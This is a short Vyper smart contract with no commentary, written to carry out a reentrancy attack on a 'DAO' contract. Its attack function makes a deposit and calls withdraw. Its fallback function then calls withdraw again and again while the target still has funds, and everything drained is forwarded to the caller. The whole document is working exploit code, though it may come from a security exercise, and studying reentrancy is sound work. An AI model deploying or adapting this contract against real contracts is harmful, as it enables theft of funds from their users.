interface DAO:
    def deposit() -> bool: payable
    def withdraw() -> bool: nonpayable
    def userBalances(addr: address) -> uint256: view

dao_address: public(address)
owner_address: public(address)

@external
def __init__():
    self.dao_address = ZERO_ADDRESS
    self.owner_address = ZERO_ADDRESS

@internal
def _attack() -> bool:
    assert self.dao_address != ZERO_ADDRESS
    
    if self.dao_address.balance > 0:           
        DAO(self.dao_address).withdraw()
    else:
        return False
    return True

@external
@payable
def attack(dao_address:address):
    self.dao_address = dao_address
    deposit_amount: uint256 = msg.value    
 
    if dao_address.balance < msg.value:
        deposit_amount = dao_address.balance
    
    DAO(self.dao_address).deposit(value=deposit_amount)
    
    self._attack()
    
    self.owner_address = msg.sender
    send(self.owner_address, self.balance)

    pass

@external
@payable
def __default__():
    self._attack()
    pass
